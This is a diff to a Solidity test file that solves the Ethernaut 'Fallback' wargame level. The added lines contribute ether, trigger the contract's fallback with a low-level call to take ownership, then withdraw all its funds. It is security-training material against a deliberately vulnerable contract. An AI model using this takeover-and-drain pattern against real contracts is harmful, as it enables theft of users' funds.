@@ -32,6 +32,20 @@ contract FallbackTest is DSTest {
         // LEVEL ATTACK //
         //////////////////
 
+        // Contribute to the contract beforehand
+        ethernautFallback.contribute{value: 0.0005 ether}();
+
+        // Call non-existing function to trigger fallback
+        (bool success, ) = address(ethernautFallback).call{value: 0.01 ether}(
+            abi.encodeWithSignature("nonExistingFunction()")
+        );
+
+        // Check if the fallback was successful
+        assert(success);
+
+        // Transfer all the ether to the EOA
+        ethernautFallback.withdraw();
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
